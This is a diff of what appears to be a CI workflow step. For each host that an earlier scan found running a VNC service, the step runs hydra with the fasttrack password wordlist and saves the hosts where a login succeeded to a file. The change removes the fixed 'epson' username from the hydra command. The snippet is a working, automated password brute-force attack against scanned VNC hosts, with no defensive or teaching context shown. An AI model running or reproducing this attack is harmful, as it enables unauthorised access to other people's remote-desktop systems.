@@ -25,7 +25,7 @@ jobs:
         if: steps.scan.outputs.vnc_count != '0'
         run: |
           while read ip; do
-            hydra -l epson -P /usr/share/wordlists/fasttrack.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
+            hydra -P /usr/share/wordlists/fasttrack.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
             [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
           done < vnc_hosts.txt
 
